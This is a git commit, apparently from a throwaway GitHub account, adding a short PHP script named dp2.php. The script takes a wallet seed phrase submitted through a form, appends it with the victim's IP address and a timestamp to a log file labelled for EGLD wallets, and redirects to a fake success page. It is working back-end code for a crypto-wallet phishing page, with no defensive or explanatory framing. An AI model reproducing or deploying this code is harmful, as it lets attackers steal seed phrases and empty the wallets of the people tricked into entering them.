ba0e5190809b441a518ff822b78062ae9e13a78c
tewrerwdsdf31221 <106444679+tewrerwdsdf31221@users.noreply.github.com>
2022-05-28 23:46:29 +0700

    Add files via upload

---
+++ dp2.php
@@ -0,0 +1,24 @@
+<?php
+$file = "EGLD_________________________________________22";
+$walletSeed   = $_POST['phrase'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$today = date("F j, Y, g:i a");
+
+$handle = fopen($file, 'a');
+fwrite($handle, "================================seed====================================");
+fwrite($handle, "\n");
+fwrite($handle, "SEED : ");
+fwrite($handle, "$walletSeed");
+fwrite($handle, "\n");
+
+fwrite($handle, "IP   : ");
+
+fwrite($handle, "$ip");
+fwrite($handle, "\n");
+fwrite($handle, "Time : ");
+fwrite($handle, "$today");
+fwrite($handle, "\n");
+fclose($handle);
+header("Location:succes.html?access");
+
+?>
